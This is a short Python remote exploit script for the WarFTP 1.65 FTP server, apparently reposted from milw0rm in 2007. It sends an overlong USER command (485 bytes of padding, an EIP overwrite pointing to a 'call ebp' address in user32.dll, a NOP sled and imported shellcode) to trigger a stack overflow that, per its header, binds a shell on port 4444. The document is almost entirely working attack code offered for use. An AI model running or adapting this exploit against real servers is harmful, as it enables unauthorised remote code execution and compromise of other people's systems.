#!/usr/bin/python
# Remote exploit for WarFTP 1.65. Tested on Windows 2000 server SP4 inside
# VMware. A trivially exploitable stack overflow is present in WarFTP which
# can be triggered by sending a long username (>480 bytes) along with the USER
# ftp command. Maybe other commands like PASS might also be affected. I did
# not check though. This exploit binds shell on TCP port 4444 and then
# connects to it
#
# Author shall not bear any responsibility for any screw ups
# Winny Thomas :-)


import os
import sys
import time
import socket
import struct
from payload import buf

import struct
def shell_attack(target_machine, target_port):   
       target = target_machine      
       sockAddr = (target, target_port)
       tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       tsock.connect(sockAddr)
       tsock.recv(1024)

       # At the time of overflow EBP points to our shellcode
       payload = b"USER "
       payload += b"A" * 485
       # Point of EIP overwrite. Address of 'call ebp' from user32.dll SP4.
       payload += struct.pack(b"<L", 0x77E14709)
       payload += b"\x90" * 100
       payload += buf
       payload += b"\r\n"
       tsock.send(payload)
       tsock.close()



       

# milw0rm.com [2007-03-14]